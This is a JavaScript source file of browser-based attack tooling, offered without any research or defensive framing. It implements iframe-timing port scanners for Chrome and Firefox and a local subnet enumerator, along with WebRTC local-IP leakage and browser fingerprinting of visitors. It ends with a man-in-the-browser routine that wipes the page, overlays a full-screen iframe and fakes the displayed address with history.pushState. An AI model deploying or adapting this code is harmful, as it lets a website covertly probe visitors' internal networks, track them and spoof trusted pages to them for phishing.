

// TODO: Source?
RESTRICTED_PORTS = {
    chrome: new Set([1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 53, 77, 79, 87, 95, 101, 102, 103, 104, 109, 110, 111, 113, 115, 117, 119, 123, 135, 139, 143, 179, 389, 465, 512, 513, 514, 515, 526, 530, 531, 532, 540, 556, 563, 587, 601, 636, 993, 995, 2049, 3659, 4045, 6000, 6665, 6666, 6667, 6668, 6669, 6697, 65535]),
    firefox: new Set([1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 53, 77, 79, 87, 95, 101, 102, 103, 104, 109, 2, 110, 3, 111, 113, 115, 117, 119, 123, 135, 139, 143, 2, 179, 389, 465, 512, 513, 514, 515, 526, 530, 531, 532, 540, 556, 563, 587, 601, 636, 993, 995, 3, 2049, 4045, 6000]),
    edge: new Set([19, 21, 25, 110, 119, 143, 220, 993,]),
    safari: new Set([1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 53, 77, 79, 87, 95, 101, 102, 103, 104, 109, 110, 111, 113, 115, 117, 119, 123, 135, 139, 143, 179, 389, 465, 512, 513, 514, 515, 526, 530, 531, 532, 540, 556, 563, 587, 601, 636, 993, 995, 2049, 3659, 4045, 6000, 6665, 6666, 6667, 6668, 6669, 6697, 65535])
};

// The following _common ports_ have been extracted from nmap's nmap-services file, and are the 1000 tcp ports that
// are most commonly open. The set of ports should be the same as that used by nmap by default. The set was extracted
// via the following Linux commands:
//
// awk '($0 !~ /^#/ && $2 ~ /\/tcp$/)' /usr/share/nmap/nmap-services \
//  | sort -nr -k 3 \
//  | awk '(NR <= 1000) { print $2 }' \
//  | grep -o '^[[:digit:]]*' \
//  | sort -n

COMMON_PORTS = new Set([
    1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,709,711,714,720,722,726,730,731,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1093,1094,1096,1097,1098,1099,1100,1104,1106,1107,1108,1110,1111,1112,1114,1117,1119,1122,1124,1131,1138,1145,1148,1151,1152,1169,1175,1183,1186,1199,1201,1218,1234,1247,1248,1271,1272,1296,1310,1311,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1600,1666,1687,1700,1717,1718,1720,1723,1755,1761,1782,1783,1801,1840,1862,1863,1864,1875,1900,1935,1947,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2179,2190,2191,2222,2251,2260,2301,2323,2381,2383,2393,2394,2399,2401,2492,2500,2522,2525,2601,2602,2604,2605,2607,2608,2638,2701,2702,2717,2718,2725,2809,2811,2869,2875,2909,2967,2998,3000,3001,3003,3005,3006,3011,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3916,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4040,4045,4111,4125,4126,4129,4147,4200,4224,4242,4252,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5914,5915,5918,5922,5925,5940,5950,5952,5959,5960,5961,5962,5963,5981,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6051,6059,6060,6100,6101,6106,6112,6123,6129,6156,6203,6247,6346,6389,6502,6504,6510,6520,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6711,6732,6779,6788,6789,6792,6839,6881,6896,6901,6969,7000,7001,7002,7004,7007,7019,7024,7025,7050,7051,7070,7100,7103,7106,7123,7200,7201,7241,7272,7402,7435,7438,7443,7496,7512,7625,7627,7676,7741,7749,7770,7777,7778,7800,7911,7920,7921,7929,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8015,8016,8021,8022,8031,8042,8045,8050,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8095,8098,8099,8100,8180,8181,8189,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8385,8400,8402,8443,8481,8500,8540,8600,8648,8649,8651,8652,8654,8676,8701,8800,8873,8877,8888,8899,8987,8994,8996,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9098,9099,9100,9101,9102,9103,9110,9111,9197,9198,9200,9207,9220,9290,9409,9415,9418,9444,9485,9500,9501,9502,9503,9535,9575,9593,9594,9595,9618,9621,9643,9666,9673,9815,9876,9877,9878,9898,9900,9914,9917,9929,9941,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11967,12000,12174,12265,12345,13456,13722,13724,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,59110,59200,59201,59202,60020,60123,60146,60443,60642,61532,61613,61900,62078,63331,64623,64680,65000,65129,65310,65389
]);

// TODO: Add common http/https ports?

async function scan_chrome(portless_origin, input_ports) {
    const nonrestricted_input_ports = [];
    for (const port of input_ports)
        if (!RESTRICTED_PORTS.chrome.has(port))
            nonrestricted_input_ports.push(port);

    const open_ports = new Set();

    async function work() {
        while (nonrestricted_input_ports.length > 0) {
            const port = nonrestricted_input_ports.pop();
            if (port === undefined)
                return;

            const iframe = document.createElement('iframe');
            iframe.className = 'port-scanning-iframe';
            iframe.style.display = 'none';
            const a = document.createElement('a');
            a.target = iframe.name  = `probe-${port}`;

            document.body.appendChild(iframe);

            await new Promise(resolve => {
                let num_calls = 0;

                iframe.onload = () => {
                    num_calls++;
                    if (num_calls > 1) {
                        resolve();
                        iframe.remove();
                    } else {
                        a.click();
                        setTimeout(() => {
                            if (num_calls === 1)
                                open_ports.add(port);
                            resolve();
                            iframe.remove();
                        }, 250);
                    }
                };

                const target_src = `${portless_origin}:${port}`;
                a.href = `${target_src}#`;
                iframe.src = target_src;

                // NOTE: It may take a while for the iframe to load the first time. This needs to be handled as
                // a separate case via a timeout.
                setTimeout(() => {
                    resolve();
                    iframe.remove();
                }, 1500);

            });
        }
    }

    await Promise.all(new Array(Math.min(5, nonrestricted_input_ports.length)).fill().map(() => work()));

    return open_ports;
}

async function scan_firefox(portless_origin, input_ports) {
    const nonrestricted_input_ports = [];
    for (const port of input_ports)
        if (!RESTRICTED_PORTS.firefox.has(port))
            nonrestricted_input_ports.push(port);

    const open_ports = new Set();

    for (let i = 0; i < nonrestricted_input_ports.length; i++) {
        const port = nonrestricted_input_ports[i];
        const iframe_num_id = i % 1000;

        const iframe = (() => {
            const iframe_id = `firefox-port-scanning-iframe-${iframe_num_id}`;
            const present_iframe = document.getElementById(iframe_id);
            if (present_iframe !== null)
                return present_iframe;

            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.id = iframe_id;
            iframe.className = 'port-scanning-iframe';
            iframe.src = `${portless_origin}:${port}`;

            return iframe;
        })();

        await new Promise(resolve => {
            iframe.onload = () => {
                resolve();
                open_ports.add(port);
            };

            setTimeout(() => {
                resolve();
            }, 50);

            if (!document.body.contains(iframe)) {
                document.body.appendChild(iframe);
            }
        });
    }

    document.querySelectorAll('.port-scanning-iframe').forEach(async iframe => iframe.remove());

    return open_ports;
}

function get_24_network_ip_addresses(ip_address) {
    const ip_address_network_parts = ip_address.split('.').slice(0, -1);
    const network_ip_addresses = new Array(254);

    for (let i = 1; i < 255; i++)
        network_ip_addresses[i-1] = `${ip_address_network_parts.join('.')}.${i}`;

    return network_ip_addresses;
}

function timeout_request(url, timeout_threshold) {
    return new Promise(async resolve => {
        setTimeout(() => {
            resolve(false);
        }, timeout_threshold);

        try {
            await fetch(url, {mode: 'no-cors'});
        } catch {}

        resolve(true);
    });
}

async function time_request(url) {
    const p1 = performance.now();
    try {
        await fetch(url, {mode: 'no-cors'});
    } catch {}
    return performance.now() - p1;
}

function get_local_ip() {
    return new Promise(async (resolve, reject) => {
        const rtc_peer_connection = new RTCPeerConnection({iceServers:[]});
        rtc_peer_connection.createDataChannel('');

        await rtc_peer_connection.setLocalDescription(await rtc_peer_connection.createOffer());

        rtc_peer_connection.onicecandidate = event => {
            rtc_peer_connection.onicecandidate = null;
            // The fifth field in the candidate string contains the candidate's IP address,
            // which is the same as the host's local IP address.
            resolve(event.candidate.candidate.split(' ')[4]);
        };
    })
}

async function fingerprint() {

    // fonts
    // codecs
    // drm
    // canvas

    // TODO: Really attempt this. Checkout that post about Linkedin doing this. (get ids for most popular ones)
    // in chrome: test a number of known extension ids via `chrome.runtime.connect`.

    return {
        user_agent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen_width: screen.width,
        screen_height: screen.height,
        pixel_depth: screen.pixelDepth,
        color_depth: screen.colorDepth,
        window_width: window.width,
        window_height: window.height,
        timezone: new Date().getTimezoneOffset(),
        plugin_names: Array.from(navigator.plugins).map(plugin => plugin.name),
        do_not_track_enabled: navigator.doNotTrack === '1',
        media_device_kinds: (await navigator.mediaDevices.enumerateDevices()).map(media_device_info => media_device_info.kind),
        indexed_db_supported: 'indexedDB' in window,
        local_storage_supported: 'localStorage' in window,
        session_storage_supported: 'sessionStorage' in window,
        websockets_supported: 'WebSocket' in window
    };
}

function create_cover_iframe() {
    const iframe = document.createElement('iframe');

    // Set the style so that the whole page is covered.

    iframe.style.position = 'absolute';
    iframe.style.top = '0';
    iframe.style.border = '0';
    iframe.style.height = '100%';
    iframe.style.width = '100%';

    return iframe;
}

function inject_mitb_iframe(iframe_url) {
    class Manager {
        constructor(iframe_document) {
            this.iframe_document = iframe_document;
        }

        init_mutator_observer() {
            this.mutator_observer = new MutationObserver(this._mutation_handler);
            this.mutator_observer.observe(this.iframe_document.body, {childList: true, subtree: true});
        }

        _mutation_handler(mutation_list) {
            for (const mutation of mutation_list) {
                switch (mutation.type) {
                    case 'attributes':
                        if (mutation.target.tagName === 'A' && (mutation.target.target !== '' || mutation.target.href !== '#'))
                            this.fix_a_element(mutation.target);
                        break;
                    case 'childList':
                        for (const added_node of mutation.addedNodes)
                            if (added_node.tagName === 'A')
                                this.fix_a_element(added_node);
                        break;
                    default:
                        console.warn(`Unhandled mutation event: ${mutation.type}`);
                }
            }
        }

        fix_a_element(a) {
            // TODO: Have them go somewhere else?
            a.removeAttribute('target');
            a.removeAttribute('rel');

            try {
                if (new URL(a.href).origin !== this.iframe_document.location.origin) {
                    a.href = '#';
                }
            } catch (msg) {
                console.warn(`${a.href}: ${msg}`);
            }
        }
    }

    let manager;

    function on_page_load(event) {
        const iframe_document = event.currentTarget.contentDocument;

        // Set the _displayed address_ to the target iframe url. (There is no re-direction.)
        window.history.pushState('', '', iframe_document.location.href);

        window.document.title = iframe_document.title;

        manager = new Manager(iframe_document);

        // Blank out all external links.
        iframe_document.querySelectorAll('a').forEach(a => manager.fix_a_element(a));

        manager.init_mutator_observer();

    }

    const iframe = create_cover_iframe();
    iframe.addEventListener('load', on_page_load);
    iframe.src = iframe_url;

    // Remove all elements under `document.head`.
    Array.from(document.head.children).forEach(child => child.remove());
    // Remove all elements under `document.body`.
    Array.from(document.body.children).forEach(child => child.remove());

    document.body.appendChild(iframe);
}
